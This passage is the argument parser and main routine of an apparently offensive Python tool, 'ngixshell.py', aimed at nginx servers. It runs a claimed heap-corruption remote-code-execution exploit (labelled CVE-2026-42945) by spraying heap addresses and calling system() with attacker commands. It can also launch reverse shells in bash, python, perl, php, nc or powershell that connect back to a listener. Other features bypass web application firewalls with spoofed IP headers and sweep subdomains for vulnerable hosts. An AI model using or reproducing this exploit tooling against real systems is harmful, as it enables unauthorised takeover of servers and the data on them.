        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Usage examples
──────────────
  Full auto scan (fingerprint + CVEs + web audit):
    ngixshell.py 127.0.0.1:19321
    ngixshell.py https://192.168.1.10

  Exploit (RCE):
    ngixshell.py 127.0.0.1:19321 --cmd 'id'
    ngixshell.py 127.0.0.1:19321 --cmd 'id' --rewrite-path /r
    ngixshell.py 127.0.0.1:19321 --shell
    ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell

  WAF bypass:
    ngixshell.py 127.0.0.1:19321 --waf-bypass
    ngixshell.py 127.0.0.1:19321 --waf-bypass --waf-ip 10.10.10.1

  Generate HTML report:
    ngixshell.py 127.0.0.1:19321 --html-report
    ngixshell.py 127.0.0.1:19321 --html-report results.html

  Subdomain scan:
    ngixshell.py --subdomain-scan example.com --scan-port 443

  Multiple targets:
    ngixshell.py --target-file hosts.txt --json

  With proxy / auth:
    ngixshell.py 127.0.0.1 --proxy socks5://127.0.0.1:9050
    ngixshell.py 127.0.0.1 --auth admin:pass --header "X-Token: abc"
""",
    )

    # ── Target ───────────────────────────────────────────────────────────────
    parser.add_argument("target", nargs="?", default=None, metavar="TARGET",
                        help="host, host:port, http://host:port, https://host:port "
                             "(default: 127.0.0.1:19321)")

    # ── Exploit ───────────────────────────────────────────────────────────────
    ex = parser.add_argument_group("exploit (CVE-2026-42945)")
    ex.add_argument("--cmd",      metavar="CMD",  help="command to execute via RCE")
    ex.add_argument("--cmd-file", metavar="FILE", help="file with commands (one per line)")
    ex.add_argument("--shell",    action="store_true", help="pop a reverse shell")
    ex.add_argument("--shell-type", metavar="TYPE", default="python",
                    choices=["bash", "python", "perl", "php", "nc", "powershell"],
                    help="reverse shell payload type (default: python)")
    ex.add_argument("--upgrade-shell", action="store_true",
                    help="auto-send PTY upgrade after shell connects")

    # ── Modes ─────────────────────────────────────────────────────────────────
    sp = parser.add_argument_group("special modes")
    sp.add_argument("--subdomain-scan",  metavar="DOMAIN",
                    help="scan subdomains of DOMAIN for vulnerable nginx")
    sp.add_argument("--cve",             metavar="CVE-ID",
                    help="test one specific CVE (e.g. CVE-2017-7529)")
    sp.add_argument("--list-cves",       action="store_true",
                    help="print CVE database and exit")
    sp.add_argument("--list-candidates", action="store_true",
                    help="print heap candidates and exit")
    sp.add_argument("--dry-run",         action="store_true",
                    help="fingerprint + scan only, no exploit")
    sp.add_argument("--target-file",     metavar="FILE",
                    help="file with host[:port] targets (one per line)")

    # ── WAF bypass ────────────────────────────────────────────────────────────
    wb = parser.add_argument_group("waf bypass")
    wb.add_argument("--waf-bypass",  action="store_true",
                    help="enable WAF bypass (IP spoofing, UA rotation, path obfuscation, header randomisation)")
    wb.add_argument("--waf-detect",  action="store_true",
                    help="detect WAF before scanning (auto-enabled with --waf-bypass)")
    wb.add_argument("--waf-ip",      metavar="IP", default="",
                    help="spoof this IP in bypass headers (default: random RFC1918)")

    # ── Web audit ─────────────────────────────────────────────────────────────
    wa = parser.add_argument_group("web audit (auto-enabled in scan mode)")
    wa.add_argument("--skip-headers",  action="store_true", help="skip HTTP header security audit")
    wa.add_argument("--skip-paths",    action="store_true", help="skip path discovery")
    wa.add_argument("--skip-vhosts",   action="store_true", help="skip virtual host enumeration")
    wa.add_argument("--skip-tls",      action="store_true", help="skip TLS audit")
    wa.add_argument("--path-wordlist", metavar="FILE",      help="extra paths for path discovery")

    # ── Connection ────────────────────────────────────────────────────────────
    cn = parser.add_argument_group("connection")
    cn.add_argument("--port",  type=int, default=None, help="override port")
    cn.add_argument("--tls",   action="store_true",    help="force TLS (auto-detected by default)")
    cn.add_argument("--proxy", metavar="URL",          help="http://, https://, socks5://")

    # ── HTTP ──────────────────────────────────────────────────────────────────
    ht = parser.add_argument_group("http")
    ht.add_argument("--user-agent", metavar="UA", default="nGixShell/1.0")
    ht.add_argument("--auth",       metavar="USER:PASS", help="HTTP Basic auth")
    ht.add_argument("--cookie",     metavar="VALUE")
    ht.add_argument("--header",     metavar="NAME:VALUE", action="append", default=[],
                    help="extra header (repeatable)")

    # ── Rate / timing ─────────────────────────────────────────────────────────
    rt = parser.add_argument_group("rate / timing")
    rt.add_argument("--jitter",     type=float, default=0.0, metavar="MS")
    rt.add_argument("--rate-limit", type=float, default=0.0, metavar="RPS")
    rt.add_argument("--retry",      type=int,   default=1)
    rt.add_argument("--timeout-multiplier", type=float, default=1.0, metavar="X")

    # ── Reverse shell ─────────────────────────────────────────────────────────
    rs = parser.add_argument_group("reverse shell")
    rs.add_argument("--listen-port", type=int, default=1337)
    rs.add_argument("--listen-ip",   default="",
                    help="IP the target connects back to (default: auto-detected)")

    # ── Exploit tuning ────────────────────────────────────────────────────────
    tu = parser.add_argument_group("exploit tuning")
    tu.add_argument("--tries",        type=int,   default=10)
    tu.add_argument("--spray",        type=int,   default=20)
    tu.add_argument("--body-len",     type=int,   default=4000)
    tu.add_argument("--rewrite-path", metavar="PATH", default="/api",
                    help="nginx location with a rewrite rule that captures $1 "
                         "(e.g. /r, /api, /search) — must match a 'rewrite … $1' "
                         "block in the target's nginx.conf (default: /api)")
    tu.add_argument("--build", metavar="KEY",
                    help=f"pre-computed build profile. known keys: "
                         + ", ".join(k for k in KNOWN_BUILDS if k != "_default"))
    tu.add_argument("--heap-base",   metavar="HEX",
                    help="override HEAP_BASE (hex, e.g. 0x5555556cc000). "
                         "Requires ASLR disabled on target.")
    tu.add_argument("--libc-base",   metavar="HEX",
                    help="override LIBC_BASE (hex)")
    tu.add_argument("--system-addr", metavar="HEX",
                    help="override address of system() (hex)")

    # ── Subdomain scan ────────────────────────────────────────────────────────
    sd = parser.add_argument_group("subdomain scan")
    sd.add_argument("--wordlist",     metavar="FILE")
    sd.add_argument("--subfinder",    action="store_true",
                    help="use subfinder (passive OSINT) to discover subdomains before probing")
    sd.add_argument("--scan-port",    type=int,   default=80)
    sd.add_argument("--scan-tls",     action="store_true")
    sd.add_argument("--scan-threads", type=int,   default=20)
    sd.add_argument("--scan-timeout", type=float, default=5.0)

    # ── Output ────────────────────────────────────────────────────────────────
    ou = parser.add_argument_group("output")
    ou.add_argument("--output",      metavar="FILE", help="write log to FILE")
    ou.add_argument("--json",        action="store_true", help="print JSON summary")
    ou.add_argument("--html-report", metavar="FILE", nargs="?",
                    const="ngixshell_report.html",
                    help="generate HTML report (optional filename, default: ngixshell_report.html)")
    ou.add_argument("--verbose",     action="store_true")

    args = parser.parse_args()
    print(BANNER)

    if args.list_cves:
        list_cves()
        return 0
    if args.list_candidates:
        list_candidates()
        return 0

    if args.cve and args.cve not in CVE_DB:
        parser.error(f"Unknown CVE '{args.cve}'. Use --list-cves to see IDs.")

    # Apply globals
    _verbose      = args.verbose
    _tmul         = args.timeout_multiplier
    _user_agent   = args.user_agent
    _jitter_ms    = args.jitter
    _retry_count  = args.retry
    _waf_bypass   = args.waf_bypass
    _waf_spoof_ip = args.waf_ip
    if args.rate_limit > 0:
        _rate_limiter = RateLimiter(args.rate_limit)
    if args.auth:
        _extra_headers["Authorization"] = "Basic " + base64.b64encode(args.auth.encode()).decode()
    if args.cookie:
        _extra_headers["Cookie"] = args.cookie
    for hdr in args.header:
        if ":" in hdr:
            k, _, v = hdr.partition(":")
            _extra_headers[k.strip()] = v.strip()
    if args.output:
        _log_fh = open(args.output, "w", encoding="utf-8")

    # Extra path wordlist
    extra_paths = []
    if args.path_wordlist:
        with open(args.path_wordlist) as f:
            extra_paths = [l.strip() for l in f if l.strip() and not l.startswith("#")]

    start = time.monotonic()

    try:
        # ── Subdomain scan ────────────────────────────────────────────────────
        if args.subdomain_scan:
            wl = COMMON_SUBDOMAINS
            if args.wordlist:
                with open(args.wordlist) as f:
                    wl = [l.strip() for l in f if l.strip()]
            subdomain_scan(args.subdomain_scan, wl, port=args.scan_port, tls=args.scan_tls,
                           proxy=args.proxy, n_threads=args.scan_threads, timeout=args.scan_timeout,
                           use_subfinder=args.subfinder)
            return 0

        # ── Build target list ─────────────────────────────────────────────────
        raw_targets = []
        if args.target_file:
            with open(args.target_file) as f:
                for line in f:
                    h, p, tls_f = _parse_target_line(line, args.port or 19321)
                    if h:
                        raw_targets.append((h, p, tls_f))
            if not raw_targets:
                log("[!] target-file has no valid entries")
                return 1
        else:
            tstr = args.target or "127.0.0.1:19321"
            h, p, tls_f = parse_target(tstr, args.port or 19321)
            if args.port:
                p = args.port
            raw_targets = [(h, p, tls_f)]

        all_findings     = []
        all_fingerprints = []
        all_web_audits   = []

        for t_host, t_port, tls_forced in raw_targets:
            if len(raw_targets) > 1:
                log(f"\n{'━'*60}  {t_host}:{t_port}  {'━'*60}")

            use_tls = args.tls or tls_forced
            if not use_tls:
                log(f"[*] Auto-detecting TLS for {t_host}:{t_port} ...")
                use_tls = _auto_detect_tls(t_host, t_port, args.proxy)
                log(f"[*] TLS: {'yes' if use_tls else 'no'}")

            # ── WAF detection / bypass notice ─────────────────────────────────
            waf_info = None
            if args.waf_detect or args.waf_bypass:
                waf_info = detect_waf(t_host, t_port, use_tls, args.proxy)
                if args.waf_bypass:
                    ip_note = f" (spoofing {_waf_spoof_ip})" if _waf_spoof_ip else " (random RFC1918 IP)"
                    log(f"\n[*] WAF bypass ENABLED{ip_note}")
                    log("    Techniques: X-Forwarded-For/X-Real-IP spoof, UA rotation, "
                        "path obfuscation, header case randomisation")

            # ── Apply build profile / CLI address overrides ───────────────────
            if (args.cmd or args.cmd_file or args.shell) and not args.dry_run:
                fp_ver = fingerprint_target(t_host, t_port, use_tls, args.proxy).get("server", "")
                auto_key = _auto_select_build(fp_ver)
                build_key = getattr(args, "build", None) or auto_key
                if build_key:
                    log(f"[*] Build profile : {build_key}")
                _apply_build(
                    build_key,
                    heap_base   = int(args.heap_base,   16) if getattr(args, "heap_base",   None) else None,
                    libc_base   = int(args.libc_base,   16) if getattr(args, "libc_base",   None) else None,
                    system_addr = int(args.system_addr, 16) if getattr(args, "system_addr", None) else None,
                )
                log(f"[*] HEAP_BASE   = 0x{HEAP_BASE:x}")
                log(f"[*] LIBC_BASE   = 0x{LIBC_BASE:x}")
                log(f"[*] SYSTEM_ADDR = 0x{SYSTEM_ADDR:x}")

            # ── Exploit mode ──────────────────────────────────────────────────
            if (args.cmd or args.cmd_file or args.shell) and not args.dry_run:
                if args.cmd_file:
                    with open(args.cmd_file) as f:
                        cmds = [l.strip() for l in f if l.strip()]
                    cmd = "; ".join(cmds)
                    log(f"[*] Loaded {len(cmds)} commands from {args.cmd_file}")
                elif args.shell:
                    cb_ip = args.listen_ip or _local_ip()
                    log(f"[*] Callback IP: {cb_ip}  (override with --listen-ip)")
                    cmd = _build_shell_payload(args.shell_type, cb_ip, args.listen_port)
                    log(f"[*] Shell type : {args.shell_type}")
                    log(f"[*] Payload    : {cmd}")
                else:
                    cmd = args.cmd

                if args.shell:
                    log(f"[*] Starting listener on 0.0.0.0:{args.listen_port} ...")
                    start_shell_listener(args.listen_port, upgrade=args.upgrade_shell)
                    _sleep(1)

                candidates = get_candidates()
                if not candidates:
                    log("[!] No URL-safe heap candidates for HEAP_BASE=0x"
                        f"{HEAP_BASE:x}.")
                    log("    The exploit encodes the preread-buffer address in the URI;")
                    log("    all 6 bytes must pass nginx's NGX_ESCAPE_ARGS filter.")
                    log("    Options:")
                    log("      • Use --heap-base to set the correct value for your target")
                    log("      • Use --build to select a pre-calibrated profile")
                    log("      • Requires ASLR disabled on the target (PIE determinism)")
                    log("      • Run calibrate.py locally against a target nginx worker to")
                    log("        compute the right HEAP_BASE and connection pool offsets")
                    list_candidates()
                    return 1
                log(f"[*] {len(candidates)} safe candidates")

                primary_addr = candidates[0][1]
                body         = make_body(cmd, primary_addr + FAKE_STRUCT_SIZE, args.body_len)

                log("[*] Waiting for nginx ...")
                if not wait_alive(t_host, t_port, tls=use_tls, proxy=args.proxy):
                    log("[!] nginx not responding")
                    return 1
                log("[+] Connected.")

                success = winner_addr = winner_try = None
                total_attempts = candidates_tried = 0

                for ci, (_, addr) in enumerate(candidates):
                    target_b = bytes([(addr >> (j * 8)) & 0xff for j in range(6)])
                    candidates_tried += 1
                    for an in range(args.tries):
                        total_attempts += 1
                        log(f"  [cand {ci+1}/{len(candidates)}] [try {an+1}/{args.tries}] 0x{addr:012x}")
                        if not wait_alive(t_host, t_port, timeout=10, tls=use_tls, proxy=args.proxy):
                            _sleep(2)
                            if not wait_alive(t_host, t_port, timeout=10, tls=use_tls, proxy=args.proxy):
                                log("    server not recovering, aborting")
                                return 1
                        if attempt(t_host, t_port, target_b, body,
                                   args.spray, args.body_len, use_tls, args.proxy,
                                   rewrite_path=args.rewrite_path):
                            success     = True
                            winner_addr = addr
                            winner_try  = an + 1
                            if args.shell:
                                log("[+] Crash — waiting for shell (Ctrl+C to exit)...")
                                try:
                                    while True: _sleep(1)
                                except KeyboardInterrupt:
                                    pass
                            else:
                                log(f'[+] system("{cmd}") executed')
                            log("[+] Done.")
                            break
                        _sleep(0.3)
                    if success:
                        break

                if not success:
                    log("[+] All candidates tried — no crash detected.")

                elapsed = time.monotonic() - start
                log(f"\n{'═'*60}\n  EXPLOIT REPORT\n{'═'*60}")
                log(f"  Target  : {t_host}:{t_port}")
                log(f"  Command : {cmd}")
                log(f"  Result  : {'SUCCESS' if success else 'FAILURE'}")
                log(f"  Elapsed : {elapsed:.1f}s")
                if winner_addr:
                    log(f"  Address : 0x{winner_addr:012x}  (try {winner_try})")
                log("═" * 60)
                return 0 if success else 1

            # ── Auto / scan mode ──────────────────────────────────────────────
            fp      = fingerprint_target(t_host, t_port, use_tls, args.proxy)
            version = fp.get("version_tuple")
            findings = cve_scan(t_host, t_port, use_tls, args.proxy,
                                target_cve=args.cve if args.cve else None,
                                version=version)

            # ── Web audit ─────────────────────────────────────────────────────
            web_audit = {}

            if not args.skip_headers:
                web_audit["header_issues"] = audit_headers(
                    t_host, t_port, use_tls, args.proxy)

            if not args.skip_paths:
                web_audit["paths_found"] = path_discovery(
                    t_host, t_port, use_tls, args.proxy, extra_paths)
                # Parse stub_status if found in paths
                stub_entry = next(
                    (p for p in web_audit["paths_found"]
                     if p["path"] in ("/nginx_status", "/nginx-status") and p["status"] == 200),
                    None
                )
                if stub_entry and stub_entry.get("body_preview"):
                    text = stub_entry["body_preview"]
                    stub = {}
                    m = re.search(r"Active connections:\s*(\d+)", text)
                    if m: stub["active_connections"] = int(m.group(1))
                    m = re.search(r"(\d+)\s+(\d+)\s+(\d+)", text)
                    if m:
                        stub["accepts"]  = int(m.group(1))
                        stub["handled"]  = int(m.group(2))
                        stub["requests"] = int(m.group(3))
                    m = re.search(r"Reading:\s*(\d+)\s+Writing:\s*(\d+)\s+Waiting:\s*(\d+)", text)
                    if m:
                        stub["reading"] = int(m.group(1))
                        stub["writing"] = int(m.group(2))
                        stub["waiting"] = int(m.group(3))
                    web_audit["stub_status"] = stub
                else:
                    web_audit["stub_status"] = {}

            if not args.skip_vhosts:
                web_audit["vhosts_found"] = vhost_enum(
                    t_host, t_port, use_tls, args.proxy)

            if not args.skip_tls and use_tls:
                web_audit["tls_result"] = tls_audit(t_host, t_port, args.proxy)
            else:
                web_audit["tls_result"] = {}

            if waf_info:
                web_audit["waf"] = waf_info

            all_findings.extend(findings)
            all_fingerprints.append(fp)
            all_web_audits.append(web_audit)

        # ── Post-loop output ──────────────────────────────────────────────────
        elapsed = time.monotonic() - start
        h0, p0  = raw_targets[0][0], raw_targets[0][1]
        fp0     = all_fingerprints[0] if all_fingerprints else None
        wa0     = all_web_audits[0]   if all_web_audits   else None

        if args.json:
            obj = _build_json_output(h0, p0, all_findings, fp0, wa0, elapsed)
            if len(raw_targets) > 1:
                obj["all_targets"] = [{"host": h, "port": p} for h, p, _ in raw_targets]
            print(json.dumps(obj, indent=2, ensure_ascii=False))

        if args.html_report:
            html_path = args.html_report
            if html_path == "ngixshell_report.html":
                ts        = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
                html_path = f"ngixshell_{h0}_{ts}.html"
            generate_html_report(h0, p0, all_findings, fp0, wa0, elapsed, html_path)

        return 0 if not all_findings else 1

    finally:
        if _log_fh:
            _log_fh.close()


if __name__ == "__main__":
    sys.exit(main())
